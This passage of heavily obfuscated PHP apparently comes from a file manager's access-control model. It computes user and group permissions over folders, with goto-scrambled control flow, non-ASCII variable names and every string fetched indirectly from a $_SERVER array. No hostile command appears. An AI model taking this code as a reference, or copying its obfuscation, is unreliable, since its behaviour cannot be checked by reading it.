$D †¤œïã[0] : $a¨Í®†¸©ˆ; return array($b—…æ–Ë°[407] => -1, $b—…æ–Ë°[446] => array($b—…æ–Ë°[412] => $b—…æ–Ë°[1076], $b—…æ–Ë°[1687] => $b—…æ–Ë°[191], $b—…æ–Ë°[413] => LNG($b—…æ–Ë°[1862]), $b—…æ–Ë°[1702] => $b—…æ–Ë°[1863]), $b—…æ–Ë°[1864] => LNG($b—…æ–Ë°[1865]), $b—…æ–Ë°[1866] => $this->sourceAuthInfo($Dâ¢äÕ¦ñ)); goto cÙÁ¶“ƒõ‹; Fâêìé¾Ë: $b—…æ–Ë° =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eè”¬Ïò¢ = $Eè”¬Ïò¢ ? $Eè”¬Ïò¢ : USER_ID; $A‡Ÿ¬‹‚ = $this->makeAuthDeep($Eè”¬Ïò¢); goto A¡‰Ô§°–Á; cÙÁ¶“ƒõ‹: } protected function makeAuthDeep($e¨Ê„ÊÚ¤Î = false) { goto C†èÄ¦«Ş; Bó¯×„Í²Ù: $bÊ™× = array_to_keyvalue_group($AÆ„«¹ß¤ğ, $Aˆ›«“¨[395]); foreach ($bÊ™× as $Fª÷±ñ’¡ => $dè•”Ã˜Î÷) { $F¨…´ßñ¾å = $this->authArrayCheck($dè•”Ã˜Î÷, $e¨Ê„ÊÚ¤Î); if ($F¨…´ßñ¾å[$Aˆ›«“¨[407]] > 0) { $fò‚é®øÕÜ[] = $Fª÷±ñ’¡ . $Aˆ›«“¨[33]; } } $D»´¨™‡‡ = array(); goto AÚ‡Ğë‚íÜ; DáèšÌì¾†: $d„·â×ìÚĞ = $c±À¦¨ãŒª; foreach ($d„·â×ìÚĞ as $cñÕ„™‰”œ) { $bÂ•ñ›Œ·¿ = $F™İˆ¡ææ->getInfo($cñÕ„™‰”œ); $cÁÍ¡‘àÎ‡ = $FŞÖğîÆ®->parentLevelArray($bÂ•ñ›Œ·¿[$Aˆ›«“¨[487]]); $c±À¦¨ãŒª = array_merge($c±À¦¨ãŒª, $cÁÍ¡‘àÎ‡); } $c±À¦¨ãŒª = array_values(array_unique($c±À¦¨ãŒª)); goto AŠêİ¿•œ; aÒ©ß‹ÓÑ: $A³ïã¼İ£á = array($Aˆ›«“¨[1860] => $D»´¨™‡‡, $Aˆ›«“¨[1861] => $DÍªŸà¼›); $e·†õ”Š½[$e¨Ê„ÊÚ¤Î] = $A³ïã¼İ£á; return $A³ïã¼İ£á; goto aíëÏ¦‘·; b¸Ú²ğè¼¦: foreach ($aòÀ§šø as $B‹Í²‰Ü î) { if ($B‹Í²‰Ü î[$Aˆ›«“¨[406]] == 0 && $B‹Í²‰Ü î[$Aˆ›«“¨[1703]] == $Aˆ›«“¨[87]) { $F½ë£ÑÚ¶[] = $B‹Í²‰Ü î[$Aˆ›«“¨[393]]; } } $AÁóíñ¦à¼ = $this->userGroupParents($e¨Ê„ÊÚ¤Î); $aÏ‚õ‚áÒæ = array($Aˆ›«“¨[404] => SourceModel::TYPE_USER, $Aˆ›«“¨[484] => $e¨Ê„ÊÚ¤Î); goto fÅ´…„ŠĞ; fÅ´…„ŠĞ: if ($AÁóíñ¦à¼) { $aÏ‚õ‚áÒæ = array(array($Aˆ›«“¨[404] => SourceModel::TYPE_USER, $Aˆ›«“¨[484] => $e¨Ê„ÊÚ¤Î), array($Aˆ›«“¨[404] => SourceModel::TYPE_GROUP, $Aˆ›«“¨[484] => array($Aˆ›«“¨[411], $AÁóíñ¦à¼)), $Aˆ›«“¨[948] => $Aˆ›«“¨[1768]); } $AÆ„«¹ß¤ğ = $this->field($Aˆ›«“¨[1868])->where($aÏ‚õ‚áÒæ)->select(); $fò‚é®øÕÜ = array(); goto Bó¯×„Í²Ù; f£ƒÖ ‚ï”: $DÍªŸà¼› = array(); $AšªªÔ‰½œ = array(); $aÇâ¦ ƒ‡ = array(); goto eÇÛ¦½âº; FÉô™µçÈ´: if (isset($e·†õ”Š½[$e¨Ê„ÊÚ¤Î])) { return $e·†õ”Š½[$e¨Ê„ÊÚ¤Î]; } $aòÀ§šø = Model($Aˆ›«“¨[1867])->listData(); $F½ë£ÑÚ¶ = array(); goto b¸Ú²ğè¼¦; eÇÛ¦½âº: $AøìĞ¢ÌĞŠ = array(); if ($fò‚é®øÕÜ) { $bãÖˆ·Øáê = $FŞÖğîÆ®->where(array($Aˆ›«“¨[395] => array($Aˆ›«“¨[411], $fò‚é®øÕÜ)))->select(); foreach ($bãÖˆ·Øáê as $AÊ·æø°Õµ) { $cÁÍ¡‘àÎ‡ = $FŞÖğîÆ®->parentLevelArray($AÊ·æø°Õµ[$Aˆ›«“¨[487]]); $D»´¨™‡‡ = array_merge($D»´¨™‡‡, $cÁÍ¡‘àÎ‡); $c±À¦¨ãŒª[] = $AÊ·æø°Õµ[$Aˆ›«“¨[484]]; $DÍªŸà¼›[$AÊ·æø°Õµ[$Aˆ›«“¨[395]]] = $cÁÍ¡‘àÎ‡; $AšªªÔ‰½œ[$AÊ·æø°Õµ[$Aˆ›«“¨[395]]] = $AÊ·æø°Õµ[$Aˆ›«“¨[484]]; } } $c±À¦¨ãŒª = array_values(array_unique($c±À¦¨ãŒª)); goto DáèšÌì¾†; C†èÄ¦«Ş: $Aˆ›«“¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $e·†õ”Š½ = array(); $e¨Ê„ÊÚ¤Î = $e¨Ê„ÊÚ¤Î ? $e¨Ê„ÊÚ¤Î : USER_ID; goto FÉô™µçÈ´; AŠêİ¿•œ: foreach ($c±À¦¨ãŒª as $cñÕ„™‰”œ) { $bÂ•ñ›Œ·¿ = $F™İˆ¡ææ->getInfo($cñÕ„™‰”œ); $D»´¨™‡‡[] = $bÂ•ñ›Œ·¿[$Aˆ›«“¨[85]][$Aˆ›«“¨[395]]; $aÇâ¦ ƒ‡[$cñÕ„™‰”œ] = $bÂ•ñ›Œ·¿[$Aˆ›«“¨[85]][$Aˆ›«“¨[395]]; $AøìĞ¢ÌĞŠ[$cñÕ„™‰”œ] = $FŞÖğîÆ®->parentLevelArray($bÂ•ñ›Œ·¿[$Aˆ›«“¨[487]]); } foreach ($DÍªŸà¼› as $cÑÓºÆÓßƒ => $EÀÖÕ­Ø¿) { $cºÌ…æ£¶ = $AšªªÔ‰½œ[$cÑÓºÆÓßƒ]; if (!$cºÌ…æ£¶ || !$aÇâ¦ ƒ‡[$cºÌ…æ£¶]) { continue; } $D¤ÉÕ´‘‹“ = array(); foreach ($AøìĞ¢ÌĞŠ[$cºÌ…æ£¶] as $cñÕ„™‰”œ) { $D¤ÉÕ´‘‹“[] = $aÇâ¦ ƒ‡[$cñÕ„™‰”œ]; } $DÍªŸà¼›[$cÑÓºÆÓßƒ] = array_merge($D¤ÉÕ´‘‹“, $EÀÖÕ­Ø¿); } $D»´¨™‡‡ = array_values(array_unique($D»´¨™‡‡)); goto aÒ©ß‹ÓÑ; AÚ‡Ğë‚íÜ: $c±À¦¨ãŒª = $AÁóíñ¦à¼; $FŞÖğîÆ® = Model($Aˆ›«“¨[1197]); $F™İˆ¡ææ = Model($Aˆ›«“¨[486]); goto f£ƒÖ ‚ï”; aíëÏ¦‘·: } private function makeSourceAuth($Dª‚ÕÀ¡Ê, $b‹‰Î–÷‰ƒ, $cÊ©ÈŒ = false) { goto eƒ¤Ø”Œİ»; Dõõ‚ãÂ‰: $A„Æ„ÉŒèà = Model($C¡šëœâÌ[1197])->parentLevelArray($Dª‚ÕÀ¡Ê[$C¡šëœâÌ[487]]); $A„Æ„ÉŒèà = array_merge(array($Dª‚ÕÀ¡Ê[$C¡šëœâÌ[395]]), array_reverse($A„Æ„ÉŒèà)); $C³›½ƒÃÜõ = !1; goto Fô·ˆ¤µÏ; eƒ¤Ø”Œİ»: $C¡šëœâÌ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÆÍ²ªãÚä = $C¡šëœâÌ[87]; $C‘˜ÀßÜ» = $Dª‚ÕÀ¡Ê[$C¡šëœâÌ[484]]; goto cŸ˜İ»‡ìğ; cŸ˜İ»‡ìğ: $cøÂñÀÑ‘â = $Dª‚ÕÀ¡Ê[$C¡šëœâÌ[404]] == SourceModel::TYPE_GROUP; $b‘®„½ºÜì = $cøÂñÀÑ‘â ? $this->groupRootAuth($C‘˜ÀßÜ», $cÊ©ÈŒ) : !1; if ($b‘®„½ºÜì && Model($C¡šëœâÌ[1848])->authCheckAction($b‘®„½ºÜì[$C¡šëœâÌ[406]], $C¡šëœâÌ[1701])) { return $this->groupAuthInfo($b‘®„½ºÜì, $C‘˜ÀßÜ»); } goto Dõõ‚ãÂ‰; bÒŞ©À¯•: if (!$C³›½ƒÃÜõ) { $f‹õÜÖÈàº = Model($C¡šëœâÌ[486])->getInfo($C‘˜ÀßÜ»); $c²…¿¡ìÛµ = explode($C¡šëœâÌ[47], trim($f‹õÜÖÈàº[$C¡šëœâÌ[487]], $C¡šëœâÌ[47])); $c²…¿¡ìÛµ = array_reverse($c²…¿¡ìÛµ); foreach ($c²…¿¡ìÛµ as $fîÚÅ¡Û¢é) { if ($fîÚÅ¡Û¢é == $C¡šëœâÌ[191] || $fîÚÅ¡Û¢é == $FÆÍ²ªãÚä) { continue; } $fò Õ©ÆŒ½ = $this->groupRootAuth($fîÚÅ¡Û¢é, $cÊ©ÈŒ); if (!$fò Õ©ÆŒ½) { continue; } $C³›½ƒÃÜõ = $this->groupAuthInfo($fò Õ©ÆŒ½, $fîÚÅ¡Û¢é); break; } } if (!$C³›½ƒÃÜõ || $C³›½ƒÃÜõ[$C¡šëœâÌ[407]] <= 0) { $dôåìË¶æ = $this->authDeepCheck($Dª‚ÕÀ¡Ê[$C¡šëœâÌ[395]], $cÊ©ÈŒ); if ($dôåìË¶æ) { $C³›½ƒÃÜõ = $dôåìË¶æ; } } return $C³›½ƒÃÜõ; goto A‘Â’‹¢²Ö; Fô·ˆ¤µÏ: foreach ($A„Æ„ÉŒèà as $fĞœÎê¢’) { if (!isset($b‹‰Î–÷‰ƒ[$fĞœÎê¢’])) { continue; } $c“‘ç’ƒÍ = $this->authMake($b‹‰Î–÷‰ƒ[$fĞœÎê¢’], $cÊ©ÈŒ); if ($c“‘ç’ƒÍ[$C¡šëœâÌ[446]]) { $C³›½ƒÃÜõ = $c“‘ç’ƒÍ; break; } } if (!$cøÂñÀÑ‘â) { return $C³›½ƒÃÜõ; } if (!$C³›½ƒÃÜõ && $b‘®„½ºÜì) { $C³›½ƒÃÜõ = $this->groupAuthInfo($b‘®„½ºÜì, $C‘˜ÀßÜ»); } goto bÒŞ©À¯•; A‘Â’‹¢²Ö: } private function userIsRoot($a¾”‰åŞÄ· = false) { $c”ŒøùŒ“ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$a¾”‰åŞÄ· && _get($GLOBALS, $c”ŒøùŒ“[485])) { return !0; } $d§–Ï—Œ¢Ê = Model($c”ŒøùŒ“[506])->getInfo($a¾”‰åŞÄ·); $EÕæï–®¦ = Model($c”ŒøùŒ“[1869])->listData($d§–Ï—Œ¢Ê[$c”ŒøùŒ“[1402]]); if ($EÕæï–®¦ && $EÕæï–®¦[$c”ŒøùŒ“[1274]][$c”ŒøùŒ“[1870]] == 1) { return !0; } return !1; } private function sourceAuthInfo($eæ¼Á²×¼Â) { goto Fæ´²ÀèÁ¶; Fê°ß··ô: if (!$EÖ‰Æ¯¡–±) { return !1; } $E“Œ·ƒÀ”->groupPathDisplay($EÖ‰Æ¯¡–±); $e–…ßÇ‘´Ñ = array($EÖ‰Æ¯¡–±); goto b›—óÌËªÏ; b›—óÌËªÏ: $e–…ßÇ‘´Ñ = $E“Œ·ƒÀ”->_listAppendPath($e–…ßÇ‘´Ñ); $EÖ‰Æ¯¡–± = $e–…ßÇ‘´Ñ[0]; $B”ô‡’ = $EÖ‰Æ¯¡–±[$Cøà«””[495]]; goto d÷À°–”é„; Fæ´²ÀèÁ¶: $Cøà«”” =& $_SERVER[ÒÆ›ÆØÎ¾]; $E“Œ·ƒÀ” = Model($Cøà«””[1197]); $EÖ‰Æ¯¡–± = $E“Œ·ƒÀ”->sourceInfo($eæ¼Á²×¼Â); goto Fê°ß··ô; d÷À°–”é„: if (isset($EÖ‰Æ¯¡–±[$Cøà«””[492]])) { $e±‡°†¯ÓÈ = explode($Cøà«””[8], trim($EÖ‰Æ¯¡–±[$Cøà«””[495]], $Cøà«””[8])); array_shift($e±‡°†¯ÓÈ); $B”ô‡’ = $EÖ‰Æ¯¡–±[$Cøà«””[490]] . $Cøà«””[1871] . implode($Cøà«””[8], $e±‡°†¯ÓÈ); } return array($Cøà«””[413] => $EÖ‰Æ¯¡–±[$Cøà«””[28]], $Cøà«””[76] => KodIO::make($EÖ‰Æ¯¡–±[$Cøà«””[395]]), $Cøà«””[1872] => $B”ô‡’); goto F‚æìŠ¾…; F‚æìŠ¾…: } private function groupAuthInfo($F“¶ÅŞàŠ, $AÄšĞ‡¹êñ) { $AÒÑ¢éøç =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÛÉ—Ä…Íğ = Model($AÒÑ¢éøç[486])->getInfo($AÄšĞ‡¹êñ); return array($AÒÑ¢éøç[1873] => intval($F“¶ÅŞàŠ[$AÒÑ¢éøç[406]]), $AÒÑ¢éøç[1857] => $F“¶ÅŞàŠ, $AÒÑ¢éøç[1874] => LNG($AÒÑ¢éøç[1875]), $AÒÑ¢éøç[1866] => array($AÒÑ¢éøç[413] => $dÛÉ—Ä…Íğ[$AÒÑ¢éøç[28]], $AÒÑ¢éøç[76] => KodIO::make($dÛÉ—Ä…Íğ[$AÒÑ¢éøç[85]][$AÒÑ¢éøç[395]]), $AÒÑ¢éøç[1872] => $dÛÉ—Ä…Íğ[$AÒÑ¢éøç[491]])); } protected function groupRootAuth($E–ëØğ‘, $cã„íœ‰š‹ = false) { goto B‚åÎÙ×ÉÂ; B‚åÎÙ×ÉÂ: $BœùÖÎâÄé =& $_SERVER[ÒÆ›ÆØÎ¾]; $cã„íœ‰š‹ = $cã„íœ‰š‹ ? $cã„íœ‰š‹ : USER_ID; $AïùÅœ±ÎË = $cã„íœ‰š‹ . $BœùÖÎâÄé[1876] . $E–ëØğ‘; goto bª…›Ï»ÁÌ; BÈ¤µğ¯ÙÀ: $a‰¾ÌŸìì = $this->sourceAuthSelect($F›Ñ¯““«š[$BœùÖÎâÄé[85]][$BœùÖÎâÄé[395]]); $F«ê®ŒÊÜá = $a‰¾ÌŸìì ? $this->authMake($a‰¾ÌŸìì, $cã„íœ‰š‹) : !1; $eÀ¢²‰¦… = $F«ê®ŒÊÜá ? $F«ê®ŒÊÜá[$BœùÖÎâÄé[446]] : !1; goto cß±¯´Ú§™; cß±¯´Ú§™: $cèŸ¤ÏÙ´[$AïùÅœ±ÎË] = $eÀ¢²‰¦… ? $eÀ¢²‰¦… : $d¥ÁÖ¶¢¦š; return $cèŸ¤ÏÙ´[$AïùÅœ±ÎË]; goto C«óÁîØ³½; D÷³İ©•Œï: $Eéˆèˆ²Ç‰ = $this->userGroupList($cã„íœ‰š‹); $d¥ÁÖ¶¢¦š = isset($Eéˆèˆ²Ç‰[$E–ëØğ‘]) ? $Eéˆèˆ²Ç‰[$E–ëØğ‘][$BœùÖÎâÄé[406]] : !1; if ($d¥ÁÖ¶¢¦š && Model($BœùÖÎâÄé[1848])->authCheckAction($d¥ÁÖ¶¢¦š[$BœùÖÎâÄé[406]], $BœùÖÎâÄé[1701])) { $cèŸ¤ÏÙ´[$AïùÅœ±ÎË] = $d¥ÁÖ¶¢¦š; return $d¥ÁÖ¶¢¦š; } goto BÈ¤µğ¯ÙÀ; bª…›Ï»ÁÌ: static $cèŸ¤ÏÙ´ = array(); if (isset($cèŸ¤ÏÙ´[$AïùÅœ±ÎË])) { return $cèŸ¤ÏÙ´[$AïùÅœ±ÎË]; } $F›Ñ¯““«š = Model($BœùÖÎâÄé[486])->getInfo($E–ëØğ‘); goto D÷³İ©•Œï; C«óÁîØ³½: } public function authOwnerApply($a·ñ‰Ùõ‹…) { goto c…˜˜ìÃåò; c…˜˜ìÃåò: $d‘‹êì§ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($a·ñ‰Ùõ‹…[$d‘‹êì§[406]]) || isset($a·ñ‰Ùõ‹…[$d‘‹êì§[1877]]) && $a·ñ‰Ùõ‹…[$d‘‹êì§[1877]]) { return $a·ñ‰Ùõ‹…; } if (AuthModel::authCheckRoot($a·ñ‰Ùõ‹…[$d‘‹êì§[406]][$d‘‹êì§[407]])) { return $a·ñ‰Ùõ‹…; } goto eğ‹‰êë°º; C²Îõ”®Ñš: $eë“á¦×Óä = array(); $eêÍŸàÛ‰¸ = array(); foreach ($aöÉˆªˆœ as $DÃÀÔÛñ© => $c†“Ñ›éî) { $B¯¶ß‡ëÌö = $this->authFolderOwnerUser($c†“Ñ›éî); $eë“á¦×Óä[$DÃÀÔÛñ©] = $B¯¶ß‡ëÌö; $eêÍŸàÛ‰¸ = array_merge($eêÍŸàÛ‰¸, $B¯¶ß‡ëÌö[$d‘‹êì§[562]]); if ($B¯¶ß‡ëÌö[$d‘‹êì§[1878]]) { break; } } goto fäÊ¼™¥Çà; fäÊ¼™¥Çà: if (count($eêÍŸàÛ‰¸) == 0) { $eêÍŸàÛ‰¸ = $this->authFolderOwnerGroup($a·ñ‰Ùõ‹…[$d‘‹êì§[484]]); } $eêÍŸàÛ‰¸ = array_unique($eêÍŸàÛ‰¸); if (AuthModel::authCheckRoot($a·ñ‰Ùõ‹…[$d‘‹êì§[406]][$d‘‹êì§[407]])) { $eêÍŸàÛ‰¸[] = USER_ID; } goto bš¥¢Œ’Õ; bš¥¢Œ’Õ: $a·ñ‰Ùõ‹…[$d‘‹êì§[406]][$d‘‹êì§[1879]] = Model($d‘‹êì§[502])->userListInfo($eêÍŸàÛ‰¸); return $a·ñ‰Ùõ‹…; goto D¼À‚ƒÓ‚…; eğ‹‰êë°º: $Aò‚©¹“Õ‘ = Model($d‘‹êì§[1197])->parentLevelArray($a·ñ‰Ùõ‹…[$d‘‹êì§[487]]); $Aò‚©¹“Õ‘ = array_merge(array($a·ñ‰Ùõ‹…[$d‘‹êì§[395]]), array_reverse($Aò‚©¹“Õ‘)); $aöÉˆªˆœ = $this->sourceAuthSelect($Aò‚©¹“Õ‘); goto C²Îõ”®Ñš; D¼À‚ƒÓ‚…: } private function authFolderOwnerGroup($DÍÁ÷Ş×‚) { $C©Öºæğ“ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bç–¹Ã¨ = Model($C©Öºæğ“[1762])->where(array($C©Öºæğ“[1681] => $DÍÁ÷Ş×‚))->select(); $fÁ˜Óã§› = array(); if (!$bç–¹Ã¨) { return $fÁ˜Óã§›; } foreach ($bç–¹Ã¨ as $FšæâÊÊ) { $e×‘¨ëôŒÄ = $this->authInfo($FšæâÊÊ); if (AuthModel::authCheckRoot($e×‘¨ëôŒÄ[$C©Öºæğ“[406]])) { $fÁ˜Óã§›[] = $FšæâÊÊ[$C©Öºæğ“[1517]]; } } return $fÁ˜Óã§›; } private function authFolderOwnerUser($BÆîÊßŠ­“) { $aæĞ¼•¡Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cƒ­í„Š¡¾ = array(); $AÑ«êƒ¶Œå = !1; foreach ($BÆîÊßŠ­“ as $Aå‡ÉñÖñÏ) { $Eïó’©‡«Š = $this->authInfo($Aå‡ÉñÖñÏ); if ($Aå‡ÉñÖñÏ[$aæĞ¼•¡Á[484]] == $aæĞ¼•¡Á[191]) { $AÑ«êƒ¶Œå = !0; } if ($Aå‡ÉñÖñÏ[$aæĞ¼•¡Á[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Eïó’©‡«Š[$aæĞ¼•¡Á[406]])) { $Cƒ­í„Š¡¾[] = $Aå‡ÉñÖñÏ[$aæĞ¼•¡Á[484]]; } } } return array($aæĞ¼•¡Á[562] => $Cƒ­í„Š¡¾, $aæĞ¼•¡Á[1878] => $AÑ«êƒ¶Œå); } public function authMake($cº­¹—‹‘ƒ, $c¼Œ«§¸ÀÃ = false) { $C˜´Şº¨Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $c‹èŠÀçõ¡ = $this->authArrayCheck($cº­¹—‹‘ƒ, $c¼Œ«§¸ÀÃ); if ($c‹èŠÀçõ¡[$C˜´Şº¨Á[1880]]) { $c‹èŠÀçõ¡[$C˜´Şº¨Á[1880]] = $this->sourceAuthInfo($c‹èŠÀçõ¡[$C˜´Şº¨Á[1880]]); } return $c‹èŠÀçõ¡; } public function authArrayCheck($d›ï„Í‰à™, $dÙõ©•˜ « = false) { goto dÃ±¼Íº“ì; f…òÖ„ä¦: return $Dº†í‹ßª; goto d§ï¸õåŸÓ; Få¢»‚³ÍÅ: foreach ($d›ï„Í‰à™ as $aÓªÛ³®ßÀ) { $bÖÙ‡À¤‰Â = $this->authInfo($aÓªÛ³®ßÀ); if (!$bÖÙ‡À¤‰Â) { continue; } $Cø¢ÕŒ’‚ª = $aÓªÛ³®ßÀ[$dâºÈËÂœİ[484]]; $B‰ÎôÛÛ¸Œ = intval($bÖÙ‡À¤‰Â[$dâºÈËÂœİ[406]]); if ($aÓªÛ³®ßÀ[$dâºÈËÂœİ[404]] == SourceModel::TYPE_USER && $Cø¢ÕŒ’‚ª == $dÙõ©•˜ «) { $e¬Î©—ÃĞí = !0; $D¨´¢›…Ó = $bÖÙ‡À¤‰Â; $dÔŠá¨ ê¿ = $B‰ÎôÛÛ¸Œ; } else { if ($aÓªÛ³®ßÀ[$dâºÈËÂœİ[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Cø¢ÕŒ’‚ª, $dÙõ©•˜ «)) { $b½øæØñ­² = !0; $Aá›çò×…å = $this->groupStepToUserGroup($Cø¢ÕŒ’‚ª, $dÙõ©•˜ «); if ($Aá›çò×…å < $D±µ¯×Š) { $D±µ¯×Š = $Aá›çò×…å; $B­î‘ê˜Ï = $B‰ÎôÛÛ¸Œ; $d Ì¸ğŠî = $bÖÙ‡À¤‰Â; $BµôĞ”®¥Ş = $Cø¢ÕŒ’‚ª; } if ($Aá›çò×…å == $D±µ¯×Š && $B‰ÎôÛÛ¸Œ >= $B­î‘ê˜Ï) { $B­î‘ê˜Ï = $B‰ÎôÛÛ¸Œ; $d Ì¸ğŠî = $bÖÙ‡À¤‰Â; $BµôĞ”®¥Ş = $Cø¢ÕŒ’‚ª; } } else { if ($Cø¢ÕŒ’‚ª == $dâºÈËÂœİ[191]) { $dÂô‡ô¯Ó£ = !0; $C™òòÓõÇî = $bÖÙ‡À¤‰Â; $Eˆİñ„˜µí = $B‰ÎôÛÛ¸Œ; } } } } if ($e¬Î©—ÃĞí) { $eß„µÃ¹´Ê = $dÔŠá¨ ê¿; $bÖÙ‡À¤‰Â = $D¨´¢›…Ó; $B·êÅÄ¡² = LNG($dâºÈËÂœİ[1881]); } else { if ($b½øæØñ­²) { $eß„µÃ¹´Ê = $B­î‘ê˜Ï; $bÖÙ‡À¤‰Â = $d Ì¸ğŠî; $A™³Í©ÄÒ = Model($dâºÈËÂœİ[486])->getInfo($BµôĞ”®¥Ş); $B·êÅÄ¡² = $dâºÈËÂœİ[160] . $A™³Í©ÄÒ[$dâºÈËÂœİ[491]] . $dâºÈËÂœİ[1882] . LNG($dâºÈËÂœİ[1883]); } else { if ($dÂô‡ô¯Ó£) { $eß„µÃ¹´Ê = $Eˆİñ„˜µí; $bÖÙ‡À¤‰Â = $C™òòÓõÇî; $B·êÅÄ¡² = LNG($dâºÈËÂœİ[1854]); } else { $eß„µÃ¹´Ê = 0; $bÖÙ‡À¤‰Â = !1; $B·êÅÄ¡² = $dâºÈËÂœİ[33]; } } } $Dº†í‹ßª = array($dâºÈËÂœİ[1873] => intval($eß„µÃ¹´Ê), $dâºÈËÂœİ[1857] => $bÖÙ‡À¤‰Â, $dâºÈËÂœİ[1874] => $B·êÅÄ¡², $dâºÈËÂœİ[1866] => $aÓªÛ³®ßÀ[$dâºÈËÂœİ[395]]); goto f…òÖ„ä¦; B‡¯Ûé¢¸¹: $D±µ¯×Š = 1000; $BµôĞ”®¥Ş = 0; $dÂô‡ô¯Ó£ = 0; goto Dî£¤¢­Æ; dÃ±¼Íº“ì: $dâºÈËÂœİ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$d›ï„Í‰à™) { return array($dâºÈËÂœİ[407] => 0, $dâºÈËÂœİ[446] => !1); } $dÙõ©•˜ « = $dÙõ©•˜ « ? $dÙõ©•˜ « : USER_ID; goto FøÏì¼à©; aâ­ÎŠçÚ: $b½øæØñ­² = 0; $B­î‘ê˜Ï = 0; $d Ì¸ğŠî = 0; goto B‡¯Ûé¢¸¹; FøÏì¼à©: $e¬Î©—ÃĞí = 0; $dÔŠá¨ ê¿ = 0; $D¨´¢›…Ó = 0; goto aâ­ÎŠçÚ; Dî£¤¢­Æ: $Eˆİñ„˜µí = 0; $C™òòÓõÇî = 0; $aÓªÛ³®ßÀ = array($dâºÈËÂœİ[395] => 0); goto Få¢»‚³ÍÅ; d§ï¸õåŸÓ: } private function groupContainUser($BÄÈÛÄî¼÷, $FŒ›¡Æµô = false) { return in_array($BÄÈÛÄî¼÷, $this->userGroupParents($FŒ›¡Æµô)); } private function groupStepToUserGroup($Bˆ’Í¶Š“, $a¤‹©ê»  = false) { goto b™ ®Š’˜«; B¶ÖáöóÓ¨: return $d¢¤±ğš; goto aíÀâïä›; DµËë­ÆÍ: $dñÒĞ‡éÍ = $GLOBALS[$AÏˆ„©‚’Á[6]][$AÏˆ„©‚’Á[88]][$AÏˆ„©‚’Á[1773]] == 1; $FÄÀÍ™…ì = $dñÒĞ‡éÍ ? 3 : 2; foreach ($D§‘…·‡²Ó as $aáäºÉ’‹) { if ($aáäºÉ’‹[$AÏˆ„©‚’Á[1681]] == $Bˆ’Í¶Š“) { return 0; } $bì¡¿ø§± = explode($AÏˆ„©‚’Á[47], trim($aáäºÉ’‹[$AÏˆ„©‚’Á[487]], $AÏˆ„©‚’Á[47])); if ($bì¡¿ø§±[0] == $AÏˆ„©‚’Á[191] && count($bì¡¿ø§±) > $FÄÀÍ™…ì) { $bèìŠö†  = array_reverse(array_slice($bì¡¿ø§±, $FÄÀÍ™…ì)); $f²ÈƒšêÕ• = array_search($Bˆ’Í¶Š“, $bèìŠö† ); if ($f²ÈƒšêÕ• !== !1 && $f²ÈƒšêÕ• + 1 <= $d¢¤±ğš) { $d¢¤±ğš = $f²ÈƒšêÕ• + 1; } } } goto B¶ÖáöóÓ¨; b™ ®Š’˜«: $AÏˆ„©‚’Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $D§‘…·‡²Ó = $this->userGroupList($a¤‹©ê» ); $d¢¤±ğš = 1000; goto DµËë­ÆÍ; aíÀâïä›: } private function userGroupList($A”ˆ£íÛ = false) { $B‡†Ñ‚Ö—Õ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $aÕ‚í“Æ«Ü = array(); if (isset($aÕ‚í“Æ«Ü[$A”ˆ£íÛ])) { return $aÕ‚í“Æ«Ü[$A”ˆ£íÛ]; } $b–ğ¸ğ„åœ = Model($B‡†Ñ‚Ö—Õ[506])->getInfo($A”ˆ£íÛ); $aÕ‚í“Æ«Ü[$A”ˆ£íÛ] = array_to_keyvalue($b–ğ¸ğ„åœ[$B‡†Ñ‚Ö—Õ[1855]], $B‡†Ñ‚Ö—Õ[1681]); return $aÕ‚í“Æ«Ü[$A”ˆ£íÛ]; } public function userGroupParents($AòÖ ò•Ò) { goto Cãá¯ÃïÜš; F‚£ÏÆˆê: if (isset($C†ÇáÌ¼§µ[$AòÖ ò•Ò])) { return $C†ÇáÌ¼§µ[$AòÖ ò•Ò]; } $aìÅ¦ÕÌ‹ = $this->userGroupList($AòÖ ò•Ò); $FñáåâÖ‹ = array(); goto B‘¨ªÉÛˆÇ; B‘¨ªÉÛˆÇ: $eŞõ¨Œ®ÆÄ = $GLOBALS[$BØÜñØáÏ[6]][$BØÜñØáÏ[88]][$BØÜñØáÏ[1773]] == 1; $b÷ˆ¦¤³¨Œ = $eŞõ¨Œ®ÆÄ ? 3 : 2; foreach ($aìÅ¦ÕÌ‹ as $ešò Ÿƒ‹«) { $f˜ÛˆĞœ× = array($ešò Ÿƒ‹«[$BØÜñØáÏ[1681]]); $Cİ•¶¬©ï = explode($BØÜñØáÏ[47], trim($ešò Ÿƒ‹«[$BØÜñØáÏ[487]], $BØÜñØáÏ[47])); if ($Cİ•¶¬©ï[0] == $BØÜñØáÏ[191] && count($Cİ•¶¬©ï) > $b÷ˆ¦¤³¨Œ) { $BìØ•‚¾¶Ä = array_slice($Cİ•¶¬©ï, $b÷ˆ¦¤³¨Œ); $f˜ÛˆĞœ× = array_merge($f˜ÛˆĞœ×, array_reverse($BìØ•‚¾¶Ä)); } $FñáåâÖ‹ = array_merge($FñáåâÖ‹, $f˜ÛˆĞœ×); } goto F÷Ñš›–ñ¾; F÷Ñš›–ñ¾: $C†ÇáÌ¼§µ[$AòÖ ò•Ò] = array_unique($FñáåâÖ‹); return $C†ÇáÌ¼§µ[$AòÖ ò•Ò]; goto cµ“ç¤¼‰î; Cãá¯ÃïÜš: $BØÜñØáÏ =& $_SERVER[ÒÆ›ÆØÎ¾]; static $C†ÇáÌ¼§µ = array(); $AòÖ ò•Ò = $AòÖ ò•Ò ? $AòÖ ò•Ò : USER_ID; goto F‚£ÏÆˆê; cµ“ç¤¼‰î: } public function authTargetInfoMake($e…™ğ‚ù¹) { goto bÊîÛì†Ì; F¾ô˜­¥‡’: foreach ($e…™ğ‚ù¹ as $f­ÎåŞİ¶¯) { if ($f­ÎåŞİ¶¯[$e†×ÛÊ°¯Œ[404]] == SourceModel::TYPE_USER) { 